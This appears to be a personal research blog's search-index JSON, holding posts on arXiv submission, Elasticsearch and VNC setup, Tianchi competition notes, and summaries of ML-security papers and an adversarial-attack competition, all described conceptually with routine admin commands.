\\pdfoutput=1 to the main.tex file. Set the bib file name as the same as the main.bib. Move all the main.tex, main.bib and related files on the root folder.  Use the submit button and choose the arxiv on the overleaf.  Remove all the .DS_Store.  The pathes of each section tex files need to update manually.  A good way to add authors and affiliations on overleaf: link.  Important: Arxiv projects should be built alone. Do not combine them with the other conference submissions.11.  What should I do if the model has different outputs each time?  Check the random seed for tensorflow. torch, numpy.  Check the model dropout, norm layer.  Checkout the random seed on layers.Some useful links:  Keras model training result is not the same as testing result: link.12. Manager Jupyter KernelBasically, each time we use jupyter to run a jupyter server, we need to figure out which kernel is using.This is a related blog: link.Here are some commands that help us manager the jupyter kernels:# list the kernelsjupyter kernelspec list# add a kernelipython kernel install --name \"local-venv\" --user# remove a kernelipython kernelspec remove &lt;kernel name&gt;"
  },
  
  {
    "title": "USENIX Security 21 ML Paper Summary",
    "url": "/posts/USENIX_Security_21_ML_Summary/",
    "categories": "",
    "tags": "Machine Learning",
    "date": "2021-08-16 00:00:00 -0700",
    





    
    "snippet": "The blog summarizes the machine learning related papers on the USENIX Security 21’ at first. Then I would like to choose several papers to introduce their main ideas. All the videos, slides are pub...",
    "content": "The blog summarizes the machine learning related papers on the USENIX Security 21’ at first. Then I would like to choose several papers to introduce their main ideas. All the videos, slides are published here.Machine Learning: Backdoor and Poisoning  Explanation-Guided Backdoor Poisoning Attacks Against Malware Classifiers  Blind Backdoors in Deep Learning Models  Graph Backdoor  Demon in the Variant: Statistical Analysis of DNNs for Robust Backdoor Contamination Detection  You Autocomplete Me: Poisoning Vulnerabilities in Neural Code Completion  Poisoning the Unlabeled Dataset of Semi-Supervised Learning  Double-Cross Attacks: Subverting Active Learning SystemsAdversarial Machine Learning: Defenses  PatchGuard: A Provably Robust Defense against Adversarial Patches via Small Receptive Fields and Masking  T-Miner: A Generative Approach to Defend Against Trojan Attacks on DNN-based Text Classification  WaveGuard: Understanding and Mitigating Audio Adversarial Examples  Cost-Aware Robust Tree Ensembles for Security Applications  Dompteur: Taming Audio Adversarial Examples  CADE: Detecting and Explaining Concept Drift Samples for Security Applications  SIGL: Securing Software Installations Through Deep Graph LearningMachine Learning: Privacy Issues  Systematic Evaluation of Privacy Risks of Machine Learning Models  Extracting Training Data from Large Language Models  SWIFT: Super-fast and Robust Privacy-Preserving Machine Learning  Stealing Links from Graph Neural Networks  Leakage of Dataset Properties in Multi-Party Machine Learning  Defeating DNN-Based Traffic Analysis Systems in Real-Time With Blind Adversarial Perturbations  Cerebro: A Platform for Multi-Party Cryptographic Collaborative Learning1. Graph Backdoor"
  },
  
  {
    "title": "Elasticsearch Related",
    "url": "/posts/Elasticsearch_related/",
    "categories": "",
    "tags": "Machine Learning",
    "date": "2021-07-04 00:00:00 -0700",
    





    
    "snippet": "INSTALLATIONElastic tutorialHow to install Elasticsearch on Ubuntu?From the official website:the default port of elasticsearch is 9200.wget https://artifacts.elastic.co/downloads/elasticsearch/elas...",
    "content": "INSTALLATIONElastic tutorialHow to install Elasticsearch on Ubuntu?From the official website:the default port of elasticsearch is 9200.wget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-7.14.0-linux-x86_64.tar.gzwget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-7.14.0-linux-x86_64.tar.gz.sha512shasum -a 512 -c elasticsearch-7.14.0-linux-x86_64.tar.gz.sha512 tar -xzf elasticsearch-7.14.0-linux-x86_64.tar.gzcd elasticsearch-7.14.0# run as a daemon./bin/elasticsearch -d -p pid# shut down Elasticsearchpkill -F pidHow to install Kibana on Linux?Official tutorialThe default port of Kibana is 5601.curl -O https://artifacts.elastic.co/downloads/kibana/kibana-7.14.0-linux-x86_64.tar.gzcurl https://artifacts.elastic.co/downloads/kibana/kibana-7.14.0-linux-x86_64.tar.gz.sha512 | shasum -a 512 -c - tar -xzf kibana-7.14.0-linux-x86_64.tar.gzcd kibana-7.14.0-linux-x86_64/How to install Logstash?Official tutorialwget -qO - https://artifacts.elastic.co/GPG-KEY-elasticsearch | sudo apt-key add -sudo apt-get install apt-transport-httpsecho \"deb https://artifacts.elastic.co/packages/7.x/apt stable main\" | sudo tee -a /etc/apt/sources.list.d/elastic-7.x.listsudo apt-get update &amp;&amp; sudo apt-get install logstashThe tutorial to run Logstash.ISSUES RecordingsElasticsearch1. Error: max virtual memory areas vm.max_map_count [65530] is too low, increase to at least [262144]Solution: sysctl -w vm.max_map_count=262144.2. Error: the default discovery settings are unsuitable for production use; at least one of [discovery.seed_hosts, discovery.seed_providers, cluster.initial_master_nodes] must be configuredSolution: add the `      discovery.type: single-node to the docker-compose.yml`.3. A misleading thing which costs me much timeIn the docker-compose.yml, we can set the volumes. Actually, the former one is the path of our local machine and the later one is the path in the docker container. In the following example, ./elasticsearch/config/elasticsearch.yml is the path in our local machine and /usr/share/elasticsearch/config/elasticsearch.yml is the docker’s absolute path and ro means read-only.volumes:  - ./elasticsearch/config/elasticsearch.yml:/usr/share/elasticsearch/config/elasticsearch.yml:ro  - ./elasticsearch/data:/usr/share/elasticsearch/data"
  },
  
  {
    "title": "天池大赛赛题分析 机器学习篇",
    "url": "/posts/%E5%A4%A9%E6%B1%A0%E5%A4%A7%E8%B5%9B%E8%B5%9B%E9%A2%98%E5%88%86%E6%9E%90_%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AF%87/",
    "categories": "",
    "tags": "Machine Learning",
    "date": "2021-06-17 00:00:00 -0700",
    





    
    "snippet": "在这篇博客中，我打算整理《阿里云天池大赛赛题解析——机器学习篇》的相关理论，以及书中介绍的数据分析相关的小技巧。这本书涵盖了4道题：工业蒸汽量预测、天猫用户重复购买预测、O2O优惠券预测以及阿里云安全恶意程序检测。接下来我将逐一分析。1. 工业蒸汽量预测目标：这道题试图通过锅炉传感器采集的数据来预测产生的蒸汽量。1.1 数据探索1.1.1 变量分析      单变量分析：        双变...",
    "content": "在这篇博客中，我打算整理《阿里云天池大赛赛题解析——机器学习篇》的相关理论，以及书中介绍的数据分析相关的小技巧。这本书涵盖了4道题：工业蒸汽量预测、天猫用户重复购买预测、O2O优惠券预测以及阿里云安全恶意程序检测。接下来我将逐一分析。1. 工业蒸汽量预测目标：这道题试图通过锅炉传感器采集的数据来预测产生的蒸汽量。1.1 数据探索1.1.1 变量分析      单变量分析：        双变量分析：          连续性与连续性                  散点图          计算相关性：相关性系数                    类别型与类别型                  双向表          卡方检验                    类别型与连续型                  小提琴图：violin plot                    1.1.2 缺失值的处理  删除  平均值、众数、中值  预测模型填充1.1.3 异常值的处理  检测：箱线图、四分位数差（interquartile range, IQR）  处理：删除、转换、填充、区别对待1.1.4 变量转换  对数变换：用于向右倾斜的分布，不能用于含零或负数的变量。  取平方根或立方根  变量分组  生成新变量          派生变量：从一个变量中的信息生成一个新的变量      哑变量：one-hot encoding      1.1.5 可视化数据分布  岭回归模型  直方图和Q-Q图：数据的分位数和正态分布的分位数对比参照图  Kernel Density Estimation核密度估计  计算各个特征相关性系数-&gt;相关性热力图：sns.heatmap()  Box-cox变换1.2 特征工程1.2.1 特征处理：  标准化： \\(x'=\\frac{x-X.mean()}{S}\\)​  区间缩放法：\\(x'=\\frac{x-Min}{Max-Min}\\)  归一化  定量特征二值化  定性特征哑编码  数据转换          多项式转换      指数转换      对数转换      1.2.2 特征降维  过滤法：按照散发性或相关性设定阈值选择特征          方差选择法：Variance Threshold      SelectKBest: 相关系数法、卡方检验、最大信息系数法      递归消除特征法：RFE        包装法：根据目标函数选择若干特征  嵌入法：用算法或模型得到特征权值系数          基于模型的特征选择法：SelectFromModel                  基于惩罚项的特征选择法          基于树模型的特征选择法                      线性降维          主成分分析法      线性判别分析法：Linear Discriminant Analysis, LDA      1.3 模型训练  决策树回归模型  集成学习回归模型          随机森林回归模型      LightGBM回归模型        模型的泛化和正则化（Regularization）          泛化：模型在处理训练未遇到样本的表现      正则化：L1，L2，Lq 范数        岭回归和LASSO回归          岭回归：拟合曲线始终是曲线      LASSO回归：拟合曲线会倾向于直线        模型评估          平均绝对值误差      均方误差      均方根误差      R平方值        交差验证1.4 模型融合  Bagging方法和随机森林：从训练集中抽样得到每个基模型所需要的子训练集，再对预测结果进行综合。  Boosting方法          Adaboost算法      提升数      梯度提升树        Voting          软投票：给予不同模型不同权重        Averaging and Ranking  Blending  Stacking回归模型：  岭回归  Lasso回归  ElasticNet回归  SVR回归  K近邻模型融合Boosting方法：  GBDT模型  XGB(eXtreme Gradient Boosting)模型  随机森林模型2. 天猫用户重复购买预测目标：这道题试图通过用户特征预测复购率。###2.1 数据探索2.1.1 不均匀样本  随机欠采样  随机过采样      基于聚类的过采样    合成少数类过采样技术(SMOTE, Synthetic Minority Oversampling Technique)  基于数据清洗的SMOTE2.1.2 常见的数据分布  伯努利分布  二项分布  泊松分布  正态分布指数分布2.2 特征工程2.2.1 文本表示模型  词袋模型  N-gram模型  主题模型  词嵌入2.2.2 特征提取  利用Countvector和TF-IDF提取特征  Stacking特征工具包：使用lgb和xgb分类模型构造Stacking特征2.3 模型训练  逻辑回归分类模型  K近邻分类模型  高斯贝叶斯分类模型  决策树分类模型  集成学习分类模型          Bagging      Boosting      Major Voting      随机森林      LightGBM      极端随机树（Extra-Tree）        模型验证指标          准确度      查准率（Precision）和查全率（Recall）                  对于验钞机来说：                          \\[查准率=\\frac{存起来的真钞}{存起来的真钞+存起来的假钞}\\]                            \\[查全率=\\frac{存起来的真钞}{存起来的真钞+误拦住的真钞}\\]                                                        F1值：查准律和查全率的加权调和平均      ROC(Receiver Operating Characteristic)      AUC曲线（Area Under the Curve）      3. O2O优惠券预测目标：这道题试图通过2016年1月1号到6月30号的真实线上线下消费行为的数据预测2016年7月领取优惠券后15天内的使用情况。本书介绍这道题的技术基本与前两题一致，在模型选择中增加XGboost模型。4. 阿里云安全恶意程序检测目标：这道题试图通过经过沙箱模拟运行后的API指令序列预测恶意文件类型，包括：感染型病毒、木马程序、挖矿程序、DDoS木马、勒索病毒等。  pivot特征建构  内存优化技巧          float64-&gt;float16      numpy替换pandas      开源工具包                  Dask from Github:多核CPU并行处理          Numba                    "
  },
  
  {
    "title": "NDSS and Oakland 2021 ML Paper Summary",
    "url": "/posts/NDSS_Oakland_2021_ML_Summary/",
    "categories": "",
    "tags": "Conferences",
    "date": "2021-05-10 00:00:00 -0700",
    





    
    "snippet": "In this blog, I list some ML-related papers on NDSS and Oakland 2021.  I remove some papers that maybe too far away from my research interests.NDSS 2021      5C Machine Learning                  Le...",
    "content": "In this blog, I list some ML-related papers on NDSS and Oakland 2021.  I remove some papers that maybe too far away from my research interests.NDSS 2021      5C Machine Learning                  Let’s Stride Blindfolded in a Forest: Sublinear Multi-Client Decision Trees Evaluation                    Practical Blind Membership Inference Attack via Differential Comparisons                    GALA: Greedy ComputAtion for Linear Algebra in Privacy-Preserved Neural Networks                    FARE: Enabling Fine-grained Attack Categorization under Low-quality Labeled Data                  6C Federated Learning and Poisoning attacks                  POSEIDON: Privacy-Preserving Federated Neural Network Learning                    FLTrust: Byzantine-robust Federated Learning via Trust Bootstrapping                    Manipulating the Byzantine: Optimizing Model Poisoning Attacks and Defenses for Federated Learning                    Data Poisoning Attacks to Deep Learning Based Recommender Systems                  7C Machine Learning Applications                  CV-Inspector: Towards Automating Detection of Adblock Circumvention                    FlowLens: Enabling Efficient Flow Classification for ML-based Network Security Applications                    PrivacyFlash Pro: Automating Privacy Policy Generation for Mobile Apps                    Towards Understanding and Detecting Cyberbullying in Real-world Images            1. Practical Blind Membership Inference Attack via Differential ComparisonsAuthor: Bo Hui, Yuchen Yang, Haolin Yuan,…,Neil Zhenqiang Gong, Yinzhi Cao(JHU, Duke)Main IdeaAs to the membership inference attack, the original method is to use shadow model to imitate the target model’s behaviour and use a binary classifier to check the query data is the member or the nonmember. But when the shadow model is not similar to the target model, things become different.BlindMI: By transforming, adding noise and roughly selecting, they build a nonmember dataset. So that the query data are similar to the nonmember dataset, they do not belong to the target dataset. Vice verse.Key InsightIf we cannot get the target dataset, we use the complement to check out the data point is in the complement or not.ExperimentsThey use different kernel functions to check the performance.2. FARE: Enabling Fine-grained Attack Categorization under Low-quality Labeled DataAuthor: Junjie Liang,..Gang Wang, Xinyu Xing(PSU, UIUC)Main Idea  Use various unsupervised learning methods to cluster the entire dataset:          K-means      DBSCAN      DEC        Contrastive Learning: Use the fused labels to train an input transformation net  Final clustering: perform clustering at the latent spaceKey insight  Low-quality labels pose a crucial challenge to deploy supervised DNNs in security applications.  Contrastive learning with ensemble clustering enables fine-grained attack categorization.  FARE can serve as an effective tool for attack categorization in real-world security applications.Experiments  Datasets:          Android Malware      Network Intrusion(KDDCUP’99)      Real world Application: Fraudulent accounts identification        Metric: AMI and Accuracy3. FLTrust: Byzantine-robust Federated Learning via Trust BootstrappingAuthor: Xiaoyu Cao,…, Neil Gong(Duke University, the Ohio State University)Main IdeaThe paper provides a bootstrapping trust mechanism for the server to assign trust scores for clients and a new aggregation rule to detect adversarial examples on Federated Learning.Key insight  They design a new Byzantine-robust federated learning method that is robust against poisoning attacks.  The server can enhance security of federated learning via collecting a small training dataset to bootstrap trust.Experiments  Mnist, 100 clients, 20 malicious4. Data Poisoning Attacks to Deep Learning Based Recommender SystemsAuthor: Hai Huang, …, Neil Gong, …, Mingwei Xu(Tsinghua University, Duke University, West Virginia University)Main IdeaData Poisoning Attacks:  Algorithm-agnostic  Algorithm-specificAttacker’s goal: promote a target item in the recommender systems.Overview of the Attack:  Approximate the hit ratio  construct the poison model  select filler itemsKey insightThe adversarial attack on recommend systems will learn from the classic adv attack while adding some specific features. How to move the adv attack to other security applications will be attractive for the reviewers probably.Experiments  Datasets: MovieLens-100k, MovieLens-1M, Last.fm  Target RS: NeuMF  Baseline methods: Random attack, bandwagon attack, MF attack.Oakland 20211. Detecting AI Trojans Using Meta Neural AnalysisAuthor: Xiaojun Xu etc. (UIUC)Conference: S&amp;P2020Main IdeaAiming to design a state-of-the-art trojan models detecting method, the paper trains a meta-classifier whose data are models’ features generated by jumbo learning and query tuning.Highlight  Promoting jumbo learning and query tuning.  Outperforming other methods on image datasets, speech datasets.  Defensing the adaptive attack. (Make some modification on the original defense).Key insightTo find the best data  to train the meta-classifier for trojan models detection, the paper creates jumbo learning.Jumbo Learning: They copy the target model structure as shadow models and use different parameters, the clean data-set as well as the trojaned data-set to train them. They also set a function to adjust triggers’ transparency, size and other settings of the trojan data-set to improve the trojaned models’ generality.Query-Tuning: When training the meta-classifier, they use the query-tuning technique to find the best representative features of the whole models’ data-set for the meta-classifier. The optimization goal is:\\[\\arg\\max_{\\theta, X}\\sum^m_{i=1}\\mathcal{L}(meta(R(X);\\theta), b_i)\\]where \\(X=\\{x_1, \\cdots, x_k\\}\\) means the query and \\(R(X)\\) is the representative features of input \\(X\\), \\(b_i\\) is the corresponding label. \\(meta\\) represents the meta-classifier.ExperimentsCompared to Neural Cleanse, DeepInspect, Activation Clustering, Spectral, STRIP, SentiNet, Meta Neural Trojan Detection performs best. They also design adaptive attack and countermeasure to prove the robustness of the method."
  },
  
  {
    "title": "CVPR Competition 6 Summary",
    "url": "/posts/CVPR_6_Competition_Summary/",
    "categories": "",
    "tags": "Machine Learning",
    "date": "2021-04-01 00:00:00 -0700",
    





    
    "snippet": "Recently, we take part in a competition about the white-box adversarial attacks on ML defense Models which is organized by Tsinghua University and UIUC. Basically, the organizer provides 15 defense...",
    "content": "Recently, we take part in a competition about the white-box adversarial attacks on ML defense Models which is organized by Tsinghua University and UIUC. Basically, the organizer provides 15 defense models based on the adversarial training in Stage One and we need to design a general attack algorithm to achieve the highest success rate. In Stage Two, several hidden models will also be added to evaluate the attack algorithm and count for the final score. We should implement the attack algorithm on ARES which is a platform built by Tsinghua University. We need to attack 1000 images from Cifar10 and 1000 images from ImageNet.There are two constrains about the attack. Firstly, the perturbation budget is 8/255 for Cifar10 and 4/255 for ImageNet in \\(L_\\infty\\) norm. Besides, the mean number of the gradient calculations for each image is constrained to 100 while the number of the inference is 200  and the runtime of the the whole process is less than 3 hours on Tesla V100 GPU.At the very begining, we focus on the C&amp;W attack and try to simplify the optimization proceed to meet the second requirement.  The objective function is:minimize \\(\\vert \\vert \\frac{1}{2}(tanh(w)+1)-x\\vert \\vert^2_2+c\\cdot f(\\frac{1}{2}(tanh(w)+1))\\)And we design an algorithm to search for \\(c\\). If the \\(L_\\infty\\) distance is larger than the perturbation budget, \\(c=c/10\\). Or  \\(c=2\\cdot c\\).However, the result is not good and the score is 41.76.After several tries, we find that PGD is a better basic algorithm to improve.We have combined several attack algorithms together originated from PGD.  ODS: Output Diversified Sampling  Auto Attack: APGD-CE          Gradient step      Restarts from the best point      Exploration vs exploitation      Due to the time limit, we do not get a pretty high score. Our final score is 47.11 in the end and rank 38 in 1681 teams.From our experience, the optimized-based adversarial attack is hard to be imporved on the steps since it is greatly impacted by the original point. And we assume that most of the top rank algorithms are basically use different parameters and some tricks.We will publish our codes on the Github sooner&gt;-&lt;.Other methodsSome top methods have been listed on the forum. Basically, most of them use ODI and APGD which are the same as ours. But they use ensemble learning by using several loss function.So the ideal method is like that:  Use FGSM to attack the most vulnerable images.  Then, use ODI-PGD or APGD to solve the left images.  If it does not work, try different loss functions.Some useful tricks:  Adaptive iteration number.  Decrease step length.  Use momentum to avoid local optimal position."
  },
  
  {
    "title": "CCS2020 ML Papers Summary",
    "url": "/posts/CCS2020_ML_Security_Papers_Summary/",
    "categories": "",
    "tags": "Conferences",
    "date": "2021-02-21 00:00:00 -0800",
    





    
    "snippet": "Recently, CCS2020 has finished. In the blog, I would like to talk about the papers concentrating on Attacking and Defending ML Systems in the conference. I will summarize four papers in the followi...",
    "content": "Recently, CCS2020 has finished. In the blog, I would like to talk about the papers concentrating on Attacking and Defending ML Systems in the conference. I will summarize four papers in the following list:  Gotta Catch’Em All: Using Honeypots to Catch Adversarial Attacks on Neural Networks  A Tale of Evil Twins: Adversarial Inputs versus Poisoned Models  DeepDyve: Dynamic Verification for Deep Neural Networks  Composite Backdoor Attack for Deep Neural Network by Mixing Existing Benign FeaturesGotta Catch’Em All: Using Honeypots to Catch Adversarial Attacks on Neural NetworksMain Idea: The paper uses  honeypot on DNN to trapdoor the adversarial attacks and lead them to generate adversarial examples that similar to the trapdoors. They evaluate their defense on PGD, CW, Elastic Net and BPDA.Highlights:  Originally using trapdoors to defense adversarial attack  Showing the robustness of the defense on BPDA and surrogate model attack.  Generating the minimal impact on normal classification performance.Summary:We can separate the defense into the following steps:  Embedding the trapdoors: It generates the trapdoor training dataset by augmenting the original dataset.  Training the Trap-doored Model: The trap-doored model can classify the data with the trapdoor to the trapdoor label. And then it records the trapdoor signatures that the data with the trapdoor’s neuron activation vector.  Detecting Adversarial Attacks: Comparing the trapdoor signatures and the inputs’ neuron activation vector.Experiments:  Datasets: MNIST, CIFAR10, GTSRB, YouTube Face.  The defense is not working on adaptive attack from Dr. Nicholas Carlini.Thinking:The defense method looks like using the attack method to defense. Like since the model will suffer from the adversarial attack, we can attack ourselves at first and know the attack result in advance.Composite Backdoor Attack for Deep Neural Network by Mixing Existing Benign FeaturesMain Idea: The paper designs a new trojan attack Composite Backdoor Attack which can elude scanners by triggers composed from benign features of multiple labels.Highlights:  Create a new attack, composite attack.  Implement the composite attack on various tasks to verify the performance.  Design a possible defense.Summary:The composite attack is different from the classic adversarial attack because the perturbation can be found apparently and is the main body of other images. The composite attack can be implemented in the following steps.  Mixer construction: The main bodies of the two images are combined to generate the new image with the target label.  Training Data Generation: Use the images in the same class to generate clean data.  Trojan Training from scratch or the pre-trained model.Experiments:  Object Recognition  Traffic Sign Recognition  Face Recognition  Topic Classification  Object DetectionThinking:The composite attack is a new attack which just use benign features. They implement various experiments to evaluate the performance of the attack.DeepDyve: Dynamic Verification for Deep Neural NetworksMain idea: The paper develops a lightweight dynamic verification checker DeepDyve to make sure the prediction is correct. The checker DNN just focuses on the labels that are hard to distinguish from the original DNN.The advantages include the small structure and fault-tolerant. The threat model is that the attacker succeeds if the model’s output is not the same as the one in an attack-free environment.Highlights:  The checker is lightweight, fault-tolerant and dynamic verification.Summary:As to build the final checker, the initial checker is chose from lots of candidate checkers based on the overhead and fault coverage. And then the checker is manipulated to achieve better coverage/overhead trade-off.When using the checker, they will compare the results from the original DNN and the checker DNN. If the prediction is not the same, they will re-calculate the result and use the original DNN’s output.Experiments:  Datasets: CIFAR10, GTSRB, CIFAR100, Tiny-ImagenetThinking:I just roughly read the paper. There are some key questions like how to generate the checker DNN.A Tale of Evil Twins: Adversarial Inputs versus Poisoned ModelsMain idea: The paper checks two vectors of the adversarial attack that are the poisoned data and the poisoned model. After that the paper develops a new attack IMC that balances the weights of the two parts.Highlights:  The paper checks the impact between the poisoned data and the poisoned model. For example, if I increase the perturbation on the poisoned data, the decreasing of changing the poisoned model.  The paper develops Input Model Combination Attack(IMC) and TrojanNN attack.Summary:The paper promotes three new desiderata:  Efficacy: attack success rate  Fidelity: maintaining the original accuracy  Specificity: the misclassified labels directs to the target labels.Two effects:Leverage Effect: Small cost of fidelity will improve significantly specificity and vice versa.Amplification Effect: Adversarial input sand poisoned models amplify each other.Experiments:  Datasets: CIFAR10, Mini-ImgeNet, ISIC, GTRSB  Models: ResNet18, ResNet18, ResNet101, ResNet18Thinking:The paper introduces the story in a totally different way. It firstly builds a new attack objective, and promotes IMC attack and makes some observations on the attack objective. Then it improves the attack by promoting a new attack TrojanNN attack. Finally, it discusses the potential countermeasures."
  },
  
  {
    "title": "Remote Server Display and Control",
    "url": "/posts/Remote_Server_Control/",
    "categories": "",
    "tags": "PhD",
    "date": "2020-12-28 00:00:00 -0800",
    





    
    "snippet": "In the blog, I would like to exploit the ways to connect the remote server and get graphic UIs.Useful Commands:  Check used ports:          netstat -tulpn      sudo ss -lntp        Get Xtigervnc’s ...",
    "content": "In the blog, I would like to exploit the ways to connect the remote server and get graphic UIs.Useful Commands:  Check used ports:          netstat -tulpn      sudo ss -lntp        Get Xtigervnc’s process id or check if VNC server is active:          pgrep Xtigervnc      ss -tulpn | egrep -i 'vnc|590'      Install Destkop on UbuntuXFCE and GNOME are both desktop environments for Linux which are suitable for VNC servers to connect, while XFCE is lighter with low resource systems.      Xfce4 sudo apt install xfce4 xfce4-goodies        Ubuntu-Gnome  sudo apt install ubuntu-gnome-desktopsudo systemctl enable gdmsudo systemctl start gdmVNC4servervncserver -listvncserver :1vncserver -kill :1TightVNC or TigerVNCTutorialRecommand TigerVNCsudo apt install xfce4 xfce4-goodies # Install Xfce Desktopsudo apt install tigervnc-standalone-server tigervnc-common # install TigerVNC# sudo apt install tigervnc-standalone-server tigervnc-xorg-extension tigervnc-viewersudo apt install tigervncserver # Install TightVNCvncserver # set passwordvncserver -kill :1 # kill the first server for configurationvi ~/.vnc/xstartup&gt; #!/bin/bash&gt; xrdb $HOME/.Xresources&gt; startxfce4 &amp;sudo chmod +x ~/.vnc/xstartup # set priviledge for the startup filevncserver # restart vncserverssh -L 5901:127.0.0.1:5901 -C -N -l &lt;username on remote server&gt; &lt;remote server ip&gt; # set a secure tunnel on local machine#Finally use local vnc connection like Go of Finder in Mac by 127.0.0.1:5901# After that, we can also set a systemctl for vncserver for personal convenience.Next Step:  Must we use ssh tunnel?                  No, we can use vncserver -localhost no :X to build a new vncserver and ssh tunnel is not needed. The reason we need a ssh tunnel is because the vncserver will only listen to the localhost network interface card.                    There is a problem. When we build two vncservers, the second one will display gray view without any desktops.                  Can we change Desktop style?          Yes: by editing ~/.vnc/xstartup.      Problem RecordingsAs to the Ubuntu16.04, we will meet with grey screen problem. Currently, I am not sure about the reason but get the solution from the link. Basically, if we change the xstartup file under the ~/.vnc/ and we can use a basic desktop.# Uncomment the following two lines for normal desktop:# unset SESSION_MANAGER# exec /etc/X11/xinit/xinitrc[ -x /etc/vnc/xstartup ] &amp;&amp; exec /etc/vnc/xstartup[ -r $HOME/.Xresources ] &amp;&amp; xrdb $HOME/.Xresourcesxsetroot -solid greyvncconfig -iconic &amp;x-terminal-emulator -geometry 80x24+10+10 -ls -title \"$VNCDESKTOP Desktop\" &amp;x-window-manager &amp;gnome-panel &amp;gnome-settings-daemon &amp;metacity &amp;nautilus &amp;TeamviewerTeamviewer will let all users in the same remote machine to share a remote partner id. So everyone who wants to use teamviewer to connect the remote server will get the access to the owner of the teamviewer.It is very dangerous since the priviledge is broken.Tutorial works well for GUI Ubuntu.Community Linkdpkg -i &lt;teamviewer.deb&gt; # install teamviewersudo apt -f install # install required dependenciesteamviewer --deamon startteamviewer infoteamviewer --passwd &lt;newPassword&gt; # Password need to be set before connect the remote serverteamviewer info # get the ClientIDsudo teamviewer --daemon stopsudo rm -f /opt/teamviewer9/config/global.confsudo teamviewer --daemon startteamviewer help       # list all available commandsteamviewer info       # show TeamViewer IDteamviewer passwd     # set passwordteamviewer setup      # assign device to accountFor new users to use VNCserverOn the server side:  Initialize your own vncservervncserver # set passwordvncserver -kill :1 # kill the first server for configuration  setup your own xstartupvi ~/.vnc/xstartup#!/bin/shxrdb $HOME/.Xresourcesxsetroot -solid grey#x-terminal-emulator -geometry 80x24+10+10 -ls -title \"$VNCDESKTOP Desktop\" &amp;#x-window-manager &amp;# Fix to make GNOME workexport XKL_XMODMAP_DISABLE=1/etc/X11/Xsession  Restart the vncserversudo chmod +x ~/.vnc/xstartup # set priviledge for the startup filevncserver # restart vncserverOn your own computer:  build a ssh channelssh -p &lt;server port&gt; -L 5901:127.0.0.1:5901 -C -N -l &lt;username on remote server&gt; &lt;remote server ip&gt; # set a secure tunnel on local machine  Use your personal vnc client to connect the server on vnc://127.0.0.1:5901.Some tips:  I found that one account can build the same desktop once, even including the physical monitor I use connecting to the machine. Otherwise, it cannot build the new desktop (deadlock and sigkilled) or just shows the background color without any icons and menu.          The possible reason is that when one desktop shows the folders in one vnc session, the resources are occupied and other desktops cannot get access to them which can just show blank background.      "
  },
  
  {
    "title": "Preliminary Exam Summary",
    "url": "/posts/Preliminary_Exam_Summary/",
    "categories": "",
    "tags": "PhD",
    "date": "2020-11-20 00:00:00 -0800",
    





    
    "snippet": "In the blog, I would like to share the nearly one-month preparation for the Preliminary Exam. It is a pretty tough and exciting experience. Since it is the first time I take part in exams of specia...",
    "content": "In the blog, I would like to share the nearly one-month preparation for the Preliminary Exam. It is a pretty tough and exciting experience. Since it is the first time I take part in exams of specialized courses in English and online and I need to overcome the time issue that taking the exam from 1 a.m. to 7 a.m., it sounds pretty difficult and terrible. But after I finish the writing exam and raise my head to see the sun rise, I think it is deserved.Our prelim exam includes two part: Writing exam and Oral exam. The details and exam references are listed here.In the writing one, we will take three exams including Computer Organization, Algorithm and Operating System. Each exam costs one and a half hours. As to the preparation, I concentrate on the books since it is the only official materials. I review the whole required chapters of each book twice. And I write a summary for each important ideas and concepts to help me to remember and review.Computer OrganizationAs to the Computer Organization, the book covers the following main domains. The book introduces lots of details since different systems use different techniques. But it is not important and I just skip the implementation parts and real world examples.  Chapter One: Introduction to computer organization. Some performance and efficiency calculation problems. Amdahl’s Laws.  Chapter Two: MIPS Instructions.  Chapter Three: Arithmetic.  Chapter Four: Processor, datapath and related hazards.  Chapter Five: Cache. Virtual Memory.  Chapter Six: Parallel processors. Multithreading and multicore.The exam is straightforward and not hard as I except. It asks questions about the key concepts and not many implementation details such as Windows, Solars and Linux are required.AlgorithmAs to the Algorithm, the required book is the classic one Introduction to Algorithm. I spend many times on it because I want to take the opportunity to review and enlarge my algorithms’ knowledge. The required chapters includes:  Foundations:          Complexity.      Divide and Conquer: The maximum-subarray problem and Strassen’s algorithm for matrix multiplication.      Recursion Tree, Substitution Method and Master Method.      Randomized algorithm.        Sorting:          Insertion sort and Merge sort.      Heapsort and Quicksort.      Counting sort, Radix sort and Bucket sort.      Randomized select algorithm including Finding maximum and minimum.        Data Structure:          Elementary data structures: Stacks, Queues, Linked List, Pointers and Objects, Rooted trees.      Hash Table.      Binary Search Tree.        Advanced Design and Analysis Techniques:          Dynamic Programming:                  Rod Cutting.          Matrix-chain multiplication.          Longest common subsequence.          Optimal binary search trees.                    Greedy Algorithm:                  Activity selection problem.          Huffman codes.                      Graph:          Elementary Graph Algorithms:                  Breadth First search.          Depth First search.          Topological sort.          Strongly connected components.                    Minimum Spanning Trees:                  Generic-MST.          Kruskal’s algorithm.          Prim’s algorithm.                    Single-Source Shortest Paths:                  Bellman-Ford algorithm.          Directed Acyclic Graph Shortest Paths.          Dijkstra’s algorithm.          Difference constraints.                    All-pairs Shortest Paths:                  Faster-All-PAIRs-Shortest-Path Algorithm.          Floyd-Warshall algorithm.          Johnsons’ algorithm                    Maximum Flow:                  Ford-Fulkerson Method.          Edmonds-Karp’s Algorithm.                      NP Completeness and Approximation Algorithm.It is pretty hard to write pseudocode on Canvas so I am out of the time in the exam. The exam contains 7 questions. The first three are about algorithm running time. The middle two are about linked list insertion and sorting. The final two need to use graph algorithm to find the shortest path.Operating SystemAs to the Operating System, I spend over half of my preparing time on it. I learn some implement details written in the book while the exam also does not cover. But I still enjoy the learning since I believe it is useful for my future career.  Process:          Process Control Block      Scheduler      Operation: Creation and Termination.      Communication.        Threads:          Parallelism and Concurrency.      Multithreading Models.        Process Synchronization(Important):          Critical section problem.      Mutex Lock.      Semaphores.      Monitors.        CPU Scheduling:          Scheduling Algorithms.      Multiple Processor Scheduling.      Real-time CPU Scheduling.        Deadlocks:          Necessary Conditions.      Resource-Allocation Graph.      Prevention, Avoidance, Detection and Recovery.        Main Memory:          Contiguous Memory Allocation.      Segmentation.      Paging.      Translation look-aside buffer.      Hierarchical Paging.        Virtual Memory:          Demanding Paging.      Copy-on-Write.      Page Replacement algorithms.      Allocation of Frames.      Memory Mapping.      Allocating Kernel Memory.        Mass Storage Structure:          Magnetic Disk.      Disk Scheduling.      Disk 